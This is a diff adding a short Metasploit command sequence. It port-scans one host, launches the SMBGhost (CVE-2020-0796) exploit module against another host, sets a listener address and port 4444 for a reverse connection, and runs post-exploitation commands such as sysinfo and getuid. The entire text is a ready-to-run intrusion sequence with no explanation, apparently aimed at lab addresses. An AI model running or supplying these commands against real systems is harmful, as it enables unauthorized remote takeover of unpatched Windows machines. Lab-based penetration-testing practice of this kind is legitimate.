@@ -1,0 +1,27 @@
+# Start the Metasploit console
+msfconsole
+
+# Use a network scanner to identify open ports
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.200.10
+set THREADS 10
+run
+exit
+
+# Relaunch the Metasploit console
+msfconsole
+
+# Use an exploit for SMB Ghost vulnerability
+use exploit/windows/smb/cve_2020_0796_smbghost
+show options
+set RHOSTS 192.168.56.101
+set LHOST 192.168.56.1
+set LPORT 4444
+run
+
+
+# Perform post-exploitation tasks
+sysinfo
+getuid
+sessions -i 1
+exit
